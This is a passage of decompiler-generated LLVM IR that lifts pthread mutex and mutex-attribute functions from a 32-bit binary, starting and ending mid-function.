  %v2_805a9d5 = load i32, i32* %v1_805a9d5, align 4
  %v3_805a9d5 = icmp eq i32 %v2_805a9d5, 0
  br i1 %v3_805a9d5, label %dec_label_pc_805a9e1, label %dec_label_pc_805a9f7.loopexit

dec_label_pc_805a9f5:                             ; preds = %dec_label_pc_805a9e1
  br label %dec_label_pc_805a9f7

dec_label_pc_805a9f7.loopexit:                    ; preds = %dec_label_pc_805a9e1.dec_label_pc_805a9d5_crit_edge, %entry
  br label %dec_label_pc_805a9f7

dec_label_pc_805a9f7:                             ; preds = %dec_label_pc_805a9f7.loopexit, %dec_label_pc_805a9f5
  %storemerge = phi i32 [ 16, %dec_label_pc_805a9f7.loopexit ], [ 0, %dec_label_pc_805a9f5 ]
  %v2_805a9f7 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805a9f7, i32* %ecx.global-to-local, align 4
  %v2_805a9f8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805a9f8, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %v1_805a9d5, { 1, 0 }
  uselistorder i1 %v15_805a9ea, { 1, 0, 2 }
  uselistorder i32 %v2_805a9ea, { 1, 0 }
  uselistorder i32* %v1_805a9d514, { 1, 0 }
  uselistorder label %dec_label_pc_805a9e1, { 1, 0 }
}

define i32 @pthread_mutex_init(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg2 to i32
  store i32 %tmp3, i32* @ecx, align 4
  store i32 3, i32* %edx.global-to-local, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v1_805aa07 = icmp eq i32* %arg2, null
  %v1_805aa09 = add i32 %arg1, 16
  %v2_805aa09 = inttoptr i32 %v1_805aa09 to i32*
  store i32 0, i32* %v2_805aa09, align 4
  %v0_805aa10 = load i32, i32* %eax.global-to-local, align 4
  %v1_805aa10 = add i32 %v0_805aa10, 20
  %v2_805aa10 = inttoptr i32 %v1_805aa10 to i32*
  store i32 0, i32* %v2_805aa10, align 4
  br i1 %v1_805aa07, label %entry.dec_label_pc_805aa1b_crit_edge, label %dec_label_pc_805aa19

entry.dec_label_pc_805aa1b_crit_edge:             ; preds = %entry
  %v0_805aa1b.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805aa1b

dec_label_pc_805aa19:                             ; preds = %entry
  %v2_805aa19 = load i32, i32* %arg2, align 4
  store i32 %v2_805aa19, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805aa1b

dec_label_pc_805aa1b:                             ; preds = %entry.dec_label_pc_805aa1b_crit_edge, %dec_label_pc_805aa19
  %v0_805aa1b = phi i32 [ %v0_805aa1b.pre, %entry.dec_label_pc_805aa1b_crit_edge ], [ %v2_805aa19, %dec_label_pc_805aa19 ]
  %v1_805aa1b = load i32, i32* %eax.global-to-local, align 4
  %v2_805aa1b = add i32 %v1_805aa1b, 12
  %v3_805aa1b = inttoptr i32 %v2_805aa1b to i32*
  store i32 %v0_805aa1b, i32* %v3_805aa1b, align 4
  %v0_805aa1e = load i32, i32* %eax.global-to-local, align 4
  %v1_805aa1e = add i32 %v0_805aa1e, 4
  %v2_805aa1e = inttoptr i32 %v1_805aa1e to i32*
  store i32 0, i32* %v2_805aa1e, align 4
  %v0_805aa25 = load i32, i32* %eax.global-to-local, align 4
  %v1_805aa25 = add i32 %v0_805aa25, 8
  %v2_805aa25 = inttoptr i32 %v1_805aa25 to i32*
  store i32 0, i32* %v2_805aa25, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_805aa1b, { 1, 0 }
}

define i32 @pthread_mutex_destroy(i32 %arg1) local_unnamed_addr {
entry:
  %v1_805aa33 = add i32 %arg1, 12
  %v2_805aa33 = inttoptr i32 %v1_805aa33 to i32*
  %v3_805aa33 = load i32, i32* %v2_805aa33, align 4
  %v2_805aa36 = icmp slt i32 %v3_805aa33, 0
  br i1 %v2_805aa36, label %dec_label_pc_805aa44, label %dec_label_pc_805aa3a

dec_label_pc_805aa3a:                             ; preds = %entry
  %v7_805aa3d = icmp sgt i32 %v3_805aa33, 1
  br i1 %v7_805aa3d, label %dec_label_pc_805aa3f, label %dec_label_pc_805aa4a

dec_label_pc_805aa3f:                             ; preds = %dec_label_pc_805aa3a
  %v7_805aa42 = icmp sgt i32 %v3_805aa33, 3
  br i1 %v7_805aa42, label %dec_label_pc_805aa44, label %dec_label_pc_805aa54

dec_label_pc_805aa44:                             ; preds = %dec_label_pc_805aa3f, %entry
  ret i32 22

dec_label_pc_805aa4a:                             ; preds = %dec_label_pc_805aa3a
  %v1_805aa4a = add i32 %arg1, 16
  %v2_805aa4a = inttoptr i32 %v1_805aa4a to i8*
  %v3_805aa4a = load i8, i8* %v2_805aa4a, align 1
  %v4_805aa4a = urem i8 %v3_805aa4a, 2
  %v5_805aa4a = icmp eq i8 %v4_805aa4a, 0
  br i1 %v5_805aa4a, label %dec_label_pc_805aa5c, label %dec_label_pc_805aa56

dec_label_pc_805aa54:                             ; preds = %dec_label_pc_805aa3f
  %v1_805aa50 = add i32 %arg1, 16
  %v2_805aa50 = inttoptr i32 %v1_805aa50 to i32*
  %v3_805aa50 = load i32, i32* %v2_805aa50, align 4
  %v4_805aa50 = icmp eq i32 %v3_805aa50, 0
  br i1 %v4_805aa50, label %dec_label_pc_805aa5c, label %dec_label_pc_805aa56

dec_label_pc_805aa56:                             ; preds = %dec_label_pc_805aa4a, %dec_label_pc_805aa54
  ret i32 16

dec_label_pc_805aa5c:                             ; preds = %dec_label_pc_805aa4a, %dec_label_pc_805aa54
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_805aa5c, { 1, 0 }
  uselistorder label %dec_label_pc_805aa56, { 1, 0 }
}

define i32 @pthread_mutexattr_init(i32* %arg1) local_unnamed_addr {
entry:
  store i32 3, i32* %arg1, align 4
  ret i32 0
}

define i32 @pthread_mutexattr_destroy(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutexattr_setkind_np(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v6_805aa7b = icmp ugt i32 %arg2, 3
  br i1 %v6_805aa7b, label %dec_label_pc_805aa85, label %dec_label_pc_805aa7d

dec_label_pc_805aa7d:                             ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_805aa85

dec_label_pc_805aa85:                             ; preds = %entry, %dec_label_pc_805aa7d
  %v0_805aa85 = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_805aa7d ]
  ret i32 %v0_805aa85

; uselistorder directives
  uselistorder label %dec_label_pc_805aa85, { 1, 0 }
}

define i32 @__pthread_mutexattr_gettype(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_805aa8a = load i32, i32* %arg1, align 4
  %v2_805aa90 = inttoptr i32 %arg2 to i32*
  store i32 %v2_805aa8a, i32* %v2_805aa90, align 4
  ret i32 0
}

define i32 @__pthread_mutexattr_getpshared(i32* %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* %arg1, align 4
  ret i32 0
}

define i32 @__pthread_mutexattr_setpshared(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = or i32 %arg1, 1
  %tmp2 = icmp eq i32 %tmp, 1
  br i1 %tmp2, label %dec_label_pc_805aab0, label %dec_label_pc_805aab7

dec_label_pc_805aab0:                             ; preds = %entry
  br label %dec_label_pc_805aab7

dec_label_pc_805aab7:                             ; preds = %entry, %dec_label_pc_805aab0
  %v0_805aab7 = phi i32 [ 22, %entry ], [ 38, %dec_label_pc_805aab0 ]
  ret i32 %v0_805aab7

; uselistorder directives
  uselistorder label %dec_label_pc_805aab7, { 1, 0 }
}

define i32 @__pthread_once_fork_child() local_unnamed_addr {
entry:
  %v3_805aac2 = call i32 @pthread_mutex_init(i32 ptrtoint (i32* @global_var_8079c68.625 to i32), i32* null)
  %v3_805aace = call i32 @pthread_cond_init(i32* nonnull @global_var_8079c80.626, i32 0)
  %v0_805aad3 = load i32, i32* @global_var_8079c8c.627, align 4
  %v1_805aadb = add i32 %v0_805aad3, -2147483643
  %v6_805aadb = sub i32 2147483642, %v0_805aad3
  %v7_805aadb = and i32 %v6_805aadb, %v0_805aad3
  %v8_805aadb = icmp slt i32 %v7_805aadb, 0
  %v9_805aadb = icmp eq i32 %v1_805aadb, 0
  %v10_805aadb = icmp slt i32 %v1_805aadb, 0
  %v3_805aae0 = icmp eq i1 %v10_805aadb, %v8_805aadb
  %v4_805aae0 = icmp eq i1 %v9_805aadb, false
  %v5_805aae0 = and i1 %v4_805aae0, %v3_805aae0
  br i1 %v5_805aae0, label %dec_label_pc_805aaf6, label %dec_label_pc_805aae2

dec_label_pc_805aae2:                             ; preds = %entry
  %v1_805aae2 = add i32 %v0_805aad3, 4
  br label %dec_label_pc_805aaf6

dec_label_pc_805aaf6:                             ; preds = %entry, %dec_label_pc_805aae2
  %storemerge = phi i32 [ %v1_805aae2, %dec_label_pc_805aae2 ], [ 0, %entry ]
  %v0_805aaf9 = phi i32 [ %v1_805aae2, %dec_label_pc_805aae2 ], [ %v0_805aad3, %entry ]
  store i32 %storemerge, i32* @global_var_8079c8c.627, align 4
  ret i32 %v0_805aaf9

; uselistorder directives
  uselistorder i32 %v1_805aadb, { 1, 0 }
  uselistorder i32 %v0_805aad3, { 1, 2, 0, 4, 3 }
  uselistorder label %dec_label_pc_805aaf6, { 1, 0 }
}

define i32 @thread_self.18(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %stack_var_2097151 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v0_805aafa = load i32, i32* @esp, align 4
  %v1_805aafa = load i32, i32* @global_var_8079c4c.565, align 4
  %v7_805aafa = icmp ult i32 %v0_805aafa, %v1_805aafa
  %v1_805ab00 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_805ab00, i32* @edx, align 4
  %v1_805ab07 = icmp eq i1 %v7_805aafa, false
  br i1 %v1_805ab07, label %dec_label_pc_805ab38, label %dec_label_pc_805ab09

dec_label_pc_805ab09:                             ; preds = %entry
  %v1_805ab09 = load i32, i32* @global_var_8079c50.566, align 16
  %v7_805ab09 = icmp ult i32 %v0_805aafa, %v1_805ab09
  br i1 %v7_805ab09, label %dec_label_pc_805ab1e, label %dec_label_pc_805ab11

dec_label_pc_805ab11:                             ; preds = %dec_label_pc_805ab09
  %v1_805ab11 = load i32, i32* @global_var_8079c54.567, align 4
  %v7_805ab11 = icmp ult i32 %v0_805aafa, %v1_805ab11
  br i1 %v7_805ab11, label %dec_label_pc_805ab38, label %dec_label_pc_805ab1e

dec_label_pc_805ab1e:                             ; preds = %dec_label_pc_805ab11, %dec_label_pc_805ab09
  %v0_805ab1e = load i32, i32* @global_var_807f358.569, align 8
  %v1_805ab1e = icmp eq i32 %v0_805ab1e, 0
  br i1 %v1_805ab1e, label %dec_label_pc_805ab2c, label %dec_label_pc_805ab27

dec_label_pc_805ab27:                             ; preds = %dec_label_pc_805ab1e
  %v0_805ab27 = call i32 @__pthread_find_self()
  br label %dec_label_pc_805ab2c

dec_label_pc_805ab2c:                             ; preds = %dec_label_pc_805ab1e, %dec_label_pc_805ab27
  %v3_805ab2c = ptrtoint i32* %stack_var_2097151 to i32
  store i32 %v3_805ab2c, i32* @edx, align 4
  %v2_805ab32 = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_805ab38

dec_label_pc_805ab38:                             ; preds = %dec_label_pc_805ab11, %entry, %dec_label_pc_805ab2c
  %v0_805ab38 = phi i32 [ ptrtoint (i32* @global_var_8075120.568 to i32), %dec_label_pc_805ab11 ], [ ptrtoint (i32* @global_var_8074f40 to i32), %entry ], [ %v2_805ab32, %dec_label_pc_805ab2c ]
  ret i32 %v0_805ab38

; uselistorder directives
  uselistorder label %dec_label_pc_805ab38, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805ab2c, { 1, 0 }
}

define i32 @pthread_mutex_unlock(i32 %arg1) local_unnamed_addr {
entry:
  %v0_805ab39 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_805ab41 = add i32 %arg1, 12
  %v2_805ab41 = inttoptr i32 %v1_805ab41 to i32*
  %v3_805ab41 = load i32, i32* %v2_805ab41, align 4
  %v1_805ab44 = add i32 %v3_805ab41, -1
  %v5_805ab44 = icmp eq i32 %v3_805ab41, 0
  %v9_805ab44 = icmp eq i32 %v1_805ab44, 0
  br i1 %v9_805ab44, label %dec_label_pc_805ab62, label %dec_label_pc_805ab49

dec_label_pc_805ab49:                             ; preds = %entry
  %v10_805ab44 = icmp slt i32 %v1_805ab44, 0
  %v6_805ab44 = sub i32 0, %v3_805ab41
  %v7_805ab44 = and i32 %v3_805ab41, %v6_805ab44
  %v8_805ab44 = icmp slt i32 %v7_805ab44, 0
  %v3_805ab49 = icmp eq i1 %v10_805ab44, %v8_805ab44
  br i1 %v3_805ab49, label %dec_label_pc_805ab51, label %dec_label_pc_805ab4b

dec_label_pc_805ab4b:                             ; preds = %dec_label_pc_805ab49
  br i1 %v5_805ab44, label %dec_label_pc_805ab82, label %dec_label_pc_805ab5b

dec_label_pc_805ab51:                             ; preds = %dec_label_pc_805ab49
  %v9_805ab51 = icmp eq i32 %v3_805ab41, 2
  br i1 %v9_805ab51, label %dec_label_pc_805ab95, label %dec_label_pc_805ab56

dec_label_pc_805ab56:                             ; preds = %dec_label_pc_805ab51
  %v9_805ab56 = icmp eq i32 %v3_805ab41, 3
  br i1 %v9_805ab56, label %dec_label_pc_805abac, label %dec_label_pc_805ab5b

dec_label_pc_805ab5b:                             ; preds = %dec_label_pc_805ab4b, %dec_label_pc_805ab56
  br label %dec_label_pc_805abbf

dec_label_pc_805ab62:                             ; preds = %entry
  %v1_805ab62 = call i32 @thread_self.18(i32 %v0_805ab39)
  %v0_805ab67 = load i32, i32* @ebx, align 4
  %v1_805ab67 = add i32 %v0_805ab67, 8
  %v2_805ab67 = inttoptr i32 %v1_805ab67 to i32*
  %v3_805ab67 = load i32, i32* %v2_805ab67, align 4
  %v15_805ab67 = icmp eq i32 %v3_805ab67, %v1_805ab62
  %v1_805ab6a = icmp eq i1 %v15_805ab67, false
  br i1 %v1_805ab6a, label %dec_label_pc_805abba, label %dec_label_pc_805ab6c

dec_label_pc_805ab6c:                             ; preds = %dec_label_pc_805ab62
  %v1_805ab6c = add i32 %v0_805ab67, 4
  %v2_805ab6c = inttoptr i32 %v1_805ab6c to i32*
  %v3_805ab6c = load i32, i32* %v2_805ab6c, align 4
  %tmp12 = icmp slt i32 %v3_805ab6c, 1
  br i1 %tmp12, label %dec_label_pc_805ab7b, label %dec_label_pc_805ab73

dec_label_pc_805ab73:                             ; preds = %dec_label_pc_805ab6c
  %v1_805ab73 = add i32 %v3_805ab6c, -1
  store i32 %v1_805ab73, i32* %v2_805ab6c, align 4
  br label %dec_label_pc_805abbf

dec_label_pc_805ab7b:                             ; preds = %dec_label_pc_805ab6c
  store i32 0, i32* %v2_805ab67, align 4
  %v0_805ab85.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805ab82

dec_label_pc_805ab82:                             ; preds = %dec_label_pc_805ab4b, %dec_label_pc_805ab7b
  %v0_805ab85 = phi i32 [ %arg1, %dec_label_pc_805ab4b ], [ %v0_805ab85.pre, %dec_label_pc_805ab7b ]
  %v1_805ab85 = add i32 %v0_805ab85, 16
  %v1_805ab89 = inttoptr i32 %v1_805ab85 to i32*
  %v2_805ab89 = call i32 @__pthread_unlock(i32* %v1_805ab89)
  br label %dec_label_pc_805ab8e

dec_label_pc_805ab8e:                             ; preds = %dec_label_pc_805abac, %dec_label_pc_805ab82
  br label %dec_label_pc_805abbf

dec_label_pc_805ab95:                             ; preds = %dec_label_pc_805ab51
  %v1_805ab95 = call i32 @thread_self.18(i32 %v0_805ab39)
  %v0_805ab9a = load i32, i32* @ebx, align 4
  %v1_805ab9a = add i32 %v0_805ab9a, 8
  %v2_805ab9a = inttoptr i32 %v1_805ab9a to i32*
  %v3_805ab9a = load i32, i32* %v2_805ab9a, align 4
  %v15_805ab9a = icmp eq i32 %v3_805ab9a, %v1_805ab95
  %v1_805ab9d = icmp eq i1 %v15_805ab9a, false
  br i1 %v1_805ab9d, label %dec_label_pc_805abba, label %dec_label_pc_805ab9f

dec_label_pc_805ab9f:                             ; preds = %dec_label_pc_805ab95
  %v1_805ab9f = add i32 %v0_805ab9a, 16
  %v2_805ab9f = inttoptr i32 %v1_805ab9f to i32*
  %v3_805ab9f = load i32, i32* %v2_805ab9f, align 4
  %v4_805ab9f = icmp eq i32 %v3_805ab9f, 0
  br i1 %v4_805ab9f, label %dec_label_pc_805abba, label %dec_label_pc_805aba5

dec_label_pc_805aba5:                             ; preds = %dec_label_pc_805ab9f
  store i32 0, i32* %v2_805ab9a, align 4
  %v0_805abaf.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805abac

dec_label_pc_805abac:                             ; preds = %dec_label_pc_805ab56, %dec_label_pc_805aba5
  %v0_805abaf = phi i32 [ %arg1, %dec_label_pc_805ab56 ], [ %v0_805abaf.pre, %dec_label_pc_805aba5 ]
  %v1_805abaf = add i32 %v0_805abaf, 16
  %v1_805abb3 = inttoptr i32 %v1_805abaf to i32*
  %v2_805abb3 = call i32 @__pthread_alt_unlock(i32* %v1_805abb3)
  br label %dec_label_pc_805ab8e

dec_label_pc_805abba:                             ; preds = %dec_label_pc_805ab9f, %dec_label_pc_805ab95, %dec_label_pc_805ab62
  br label %dec_label_pc_805abbf

dec_label_pc_805abbf:                             ; preds = %dec_label_pc_805ab8e, %dec_label_pc_805ab73, %dec_label_pc_805ab5b, %dec_label_pc_805abba
  %v0_805abc2 = phi i32 [ 0, %dec_label_pc_805ab8e ], [ 0, %dec_label_pc_805ab73 ], [ 22, %dec_label_pc_805ab5b ], [ 1, %dec_label_pc_805abba ]
  store i32 %v0_805ab39, i32* @ebx, align 4
  ret i32 %v0_805abc2

; uselistorder directives
  uselistorder i32 %v3_805ab6c, { 1, 0 }
  uselistorder i32 %v1_805ab44, { 1, 0 }
  uselistorder i32 %v3_805ab41, { 0, 1, 4, 5, 3, 2 }
  uselistorder i32 %v0_805ab39, { 0, 2, 1 }
  uselistorder i32 %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_805abbf, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805abac, { 1, 0 }
  uselistorder label %dec_label_pc_805ab82, { 1, 0 }
  uselistorder label %dec_label_pc_805ab5b, { 1, 0 }
}

define i32 @__pthread_once_fork_parent() local_unnamed_addr {
entry:
  %v1_805abcb = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_8079c68.625 to i32))
  ret i32 %v1_805abcb
}

define i32 @pthread_mutex_trylock(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_805abd4 = load i32, i32* @edi, align 4
  %v0_805abd5 = load i32, i32* @esi, align 4
  %v0_805abd6 = load i32, i32* @ebx, align 4
  store i32 %v0_805abd6, i32* %stack_var_-12, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_805abdb = add i32 %arg1, 12
  %v2_805abdb = inttoptr i32 %v1_805abdb to i32*
  %v3_805abdb = load i32, i32* %v2_805abdb, align 4
  %v1_805abde = add i32 %v3_805abdb, -1
  %v5_805abde = icmp eq i32 %v3_805abdb, 0
  %v9_805abde = icmp eq i32 %v1_805abde, 0
  br i1 %v9_805abde, label %dec_label_pc_805ac07, label %dec_label_pc_805abe3

dec_label_pc_805abe3:                             ; preds = %entry
  %v10_805abde = icmp slt i32 %v1_805abde, 0
  %v6_805abde = sub i32 0, %v3_805abdb
  %v7_805abde = and i32 %v3_805abdb, %v6_805abde
  %v8_805abde = icmp slt i32 %v7_805abde, 0
  %v3_805abe3 = icmp eq i1 %v10_805abde, %v8_805abde
  br i1 %v3_805abe3, label %dec_label_pc_805abeb, label %dec_label_pc_805abe5

dec_label_pc_805abe5:                             ; preds = %dec_label_pc_805abe3
  br i1 %v5_805abde, label %dec_label_pc_805abfc, label %dec_label_pc_805abf5

dec_label_pc_805abeb:                             ; preds = %dec_label_pc_805abe3
  %v9_805abeb = icmp eq i32 %v3_805abdb, 2
  br i1 %v9_805abeb, label %dec_label_pc_805ac34, label %dec_label_pc_805abf0

dec_label_pc_805abf0:                             ; preds = %dec_label_pc_805abeb
  %v9_805abf0 = icmp eq i32 %v3_805abdb, 3
  br i1 %v9_805abf0, label %dec_label_pc_805ac4c, label %dec_label_pc_805abf5

dec_label_pc_805abf5:                             ; preds = %dec_label_pc_805abe5, %dec_label_pc_805abf0
  store i32 22, i32* @esi, align 4
  br label %dec_label_pc_805ac57

dec_label_pc_805abfc:                             ; preds = %dec_label_pc_805abe5
  %v1_805abfc = add i32 %arg1, 16
  store i32 %v1_805abfc, i32* @eax, align 4
  store i32 %v0_805abd6, i32* @ebx, align 4
  %v3_805ac02 = call i32 @__pthread_trylock(i32 %v0_805abd6, i32 %v0_805abd5, i32 %v0_805abd4)
  %v0_805ac07.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_805ac07

dec_label_pc_805ac07:                             ; preds = %entry, %dec_label_pc_805abfc
  %v0_805ac07 = phi i32 [ %v0_805abd6, %entry ], [ %v0_805ac07.pre, %dec_label_pc_805abfc ]
  %v1_805ac07 = call i32 @thread_self.18(i32 %v0_805ac07)
  %v0_805ac0c = load i32, i32* @ebx, align 4
  %v1_805ac0c = add i32 %v0_805ac0c, 8
  %v2_805ac0c = inttoptr i32 %v1_805ac0c to i32*
  %v3_805ac0c = load i32, i32* %v2_805ac0c, align 4
  %v15_805ac0c = icmp eq i32 %v3_805ac0c, %v1_805ac07
  store i32 %v1_805ac07, i32* %edi.global-to-local, align 4
  %v1_805ac11 = icmp eq i1 %v15_805ac0c, false
  br i1 %v1_805ac11, label %dec_label_pc_805ac1a, label %dec_label_pc_805ac13

dec_label_pc_805ac13:                             ; preds = %dec_label_pc_805ac07
  %v1_805ac13 = add i32 %v0_805ac0c, 4
  %v2_805ac13 = inttoptr i32 %v1_805ac13 to i32*
  %v3_805ac13 = load i32, i32* %v2_805ac13, align 4
  %v4_805ac13 = add i32 %v3_805ac13, 1
  store i32 %v4_805ac13, i32* %v2_805ac13, align 4
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_805ac57

dec_label_pc_805ac1a:                             ; preds = %dec_label_pc_805ac07
  %v1_805ac1a = add i32 %v0_805ac0c, 16
  store i32 %v1_805ac1a, i32* @eax, align 4
  %v0_805ac1d = load i32, i32* %stack_var_-12, align 4
  %v3_805ac1d = call i32 @__pthread_trylock(i32 %v0_805ac1d, i32 %v0_805abd5, i32 %v0_805abd4)
  %v1_805ac22 = icmp eq i32 %v3_805ac1d, 0
  store i32 %v3_805ac1d, i32* @esi, align 4
  %v1_805ac26 = icmp eq i1 %v1_805ac22, false
  br i1 %v1_805ac26, label %dec_label_pc_805ac57, label %dec_label_pc_805ac28

dec_label_pc_805ac28:                             ; preds = %dec_label_pc_805ac1a
  %v0_805ac28 = load i32, i32* %edi.global-to-local, align 4
  %v1_805ac28 = load i32, i32* @ebx, align 4
  %v2_805ac28 = add i32 %v1_805ac28, 8
  %v3_805ac28 = inttoptr i32 %v2_805ac28 to i32*
  store i32 %v0_805ac28, i32* %v3_805ac28, align 4
  %v0_805ac2b = load i32, i32* @ebx, align 4
  %v1_805ac2b = add i32 %v0_805ac2b, 4
  %v2_805ac2b = inttoptr i32 %v1_805ac2b to i32*
  store i32 0, i32* %v2_805ac2b, align 4
  br label %dec_label_pc_805ac57

dec_label_pc_805ac34:                             ; preds = %dec_label_pc_805abeb
  %v1_805ac34 = add i32 %arg1, 16
  store i32 %v1_805ac34, i32* @eax, align 4
  %v3_805ac37 = call i32 @__pthread_alt_trylock(i32 %v0_805abd6, i32 %v0_805abd5, i32 %v0_805abd4)
  %v1_805ac3c = icmp eq i32 %v3_805ac37, 0
  store i32 %v3_805ac37, i32* @esi, align 4
  %v1_805ac40 = icmp eq i1 %v1_805ac3c, false
  br i1 %v1_805ac40, label %dec_label_pc_805ac57, label %dec_label_pc_805ac42

dec_label_pc_805ac42:                             ; preds = %dec_label_pc_805ac34
  %v0_805ac42 = load i32, i32* %stack_var_-12, align 4
  %v1_805ac42 = call i32 @thread_self.18(i32 %v0_805ac42)
  %v1_805ac47 = load i32, i32* @ebx, align 4
  %v2_805ac47 = add i32 %v1_805ac47, 8
  %v3_805ac47 = inttoptr i32 %v2_805ac47 to i32*
  store i32 %v1_805ac42, i32* %v3_805ac47, align 4
  br label %dec_label_pc_805ac57

dec_label_pc_805ac4c:                             ; preds = %dec_label_pc_805abf0
  %v1_805ac4c = add i32 %arg1, 16
  store i32 %v1_805ac4c, i32* @eax, align 4
  store i32 %v0_805abd6, i32* @ebx, align 4
  %v3_805ac52 = call i32 @__pthread_alt_trylock(i32 %v0_805abd6, i32 %v0_805abd5, i32 %v0_805abd4)
  br label %dec_label_pc_805ac57

dec_label_pc_805ac57:                             ; preds = %dec_label_pc_805ac34, %dec_label_pc_805ac1a, %dec_label_pc_805ac42, %dec_label_pc_805ac28, %dec_label_pc_805ac13, %dec_label_pc_805abf5, %dec_label_pc_805ac4c
  %v2_805ac57 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805ac57, i32* @ebx, align 4
  %v0_805ac58 = load i32, i32* @esi, align 4
  store i32 %v0_805abd5, i32* @esi, align 4
  store i32 %v0_805abd4, i32* @edi, align 4
  ret i32 %v0_805ac58

; uselistorder directives
  uselistorder i32 %v1_805ac07, { 1, 0 }
  uselistorder i32 %v1_805abde, { 1, 0 }
  uselistorder i32 %v3_805abdb, { 0, 1, 4, 5, 3, 2 }
  uselistorder i32 %v0_805abd6, { 2, 3, 1, 0, 4, 5, 6 }
  uselistorder i32 %v0_805abd5, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v0_805abd4, { 0, 3, 2, 1, 4 }
  uselistorder i32* %stack_var_-12, { 3, 1, 2, 0, 4 }
  uselistorder i32 (i32, i32, i32)* @__pthread_alt_trylock, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_805ac57, { 6, 2, 0, 3, 1, 4, 5 }
  uselistorder label %dec_label_pc_805ac07, { 1, 0 }
  uselistorder label %dec_label_pc_805abf5, { 1, 0 }
}

define i32 @pthread_mutex_timedlock(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_805ac5f = load i32, i32* @ebx, align 4
  store i32 %v0_805ac5f, i32* %stack_var_-12, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_805ac68 = add i32 %arg2, 4
  %v2_805ac68 = inttoptr i32 %v1_805ac68 to i32*
  %v3_805ac68 = load i32, i32* %v2_805ac68, align 4
  %v6_805ac6f = icmp ugt i32 %v3_805ac68, 999999999
  br i1 %v6_805ac6f, label %dec_label_pc_805ad0a, label %dec_label_pc_805ac75

dec_label_pc_805ac75:                             ; preds = %entry
  %v1_805ac75 = add i32 %arg1, 12
  %v2_805ac75 = inttoptr i32 %v1_805ac75 to i32*
  %v3_805ac75 = load i32, i32* %v2_805ac75, align 4
  %v1_805ac78 = add i32 %v3_805ac75, -1
  %v5_805ac78 = icmp eq i32 %v3_805ac75, 0
  %v9_805ac78 = icmp eq i32 %v1_805ac78, 0
  br i1 %v9_805ac78, label %dec_label_pc_805aca0, label %dec_label_pc_805ac7d

dec_label_pc_805ac7d:                             ; preds = %dec_label_pc_805ac75
  %v10_805ac78 = icmp slt i32 %v1_805ac78, 0
  %v6_805ac78 = sub i32 0, %v3_805ac75
  %v7_805ac78 = and i32 %v3_805ac75, %v6_805ac78
  %v8_805ac78 = icmp slt i32 %v7_805ac78, 0
  %v3_805ac7d = icmp eq i1 %v10_805ac78, %v8_805ac78
  br i1 %v3_805ac7d, label %dec_label_pc_805ac88, label %dec_label_pc_805ac7f

dec_label_pc_805ac7f:                             ; preds = %dec_label_pc_805ac7d
  br i1 %v5_805ac78, label %dec_label_pc_805ac94, label %dec_label_pc_805ad0a

dec_label_pc_805ac88:                             ; preds = %dec_label_pc_805ac7d
  %v9_805ac88 = icmp eq i32 %v3_805ac75, 2
  br i1 %v9_805ac88, label %dec_label_pc_805acc9, label %dec_label_pc_805ac8d

dec_label_pc_805ac8d:                             ; preds = %dec_label_pc_805ac88
  %v9_805ac8d = icmp eq i32 %v3_805ac75, 3
  %v1_805ac90 = icmp eq i1 %v9_805ac8d, false
  br i1 %v1_805ac90, label %dec_label_pc_805ad0a, label %dec_label_pc_805acf2

dec_label_pc_805ac94:                             ; preds = %dec_label_pc_805ac7f
  %v1_805ac94 = add i32 %arg1, 16
  store i32 %v1_805ac94, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v1_805ac99 = call i32 @__pthread_lock(i32 %v0_805ac5f)
  br label %dec_label_pc_805acaf

dec_label_pc_805aca0:                             ; preds = %dec_label_pc_805ac75
  %v1_805aca0 = call i32 @thread_self.18(i32 %v0_805ac5f)
  %v0_805aca5 = load i32, i32* @esi, align 4
  %v1_805aca5 = add i32 %v0_805aca5, 8
  %v2_805aca5 = inttoptr i32 %v1_805aca5 to i32*
  %v3_805aca5 = load i32, i32* %v2_805aca5, align 4
  %v15_805aca5 = icmp eq i32 %v3_805aca5, %v1_805aca0
  store i32 %v1_805aca0, i32* @ebx, align 4
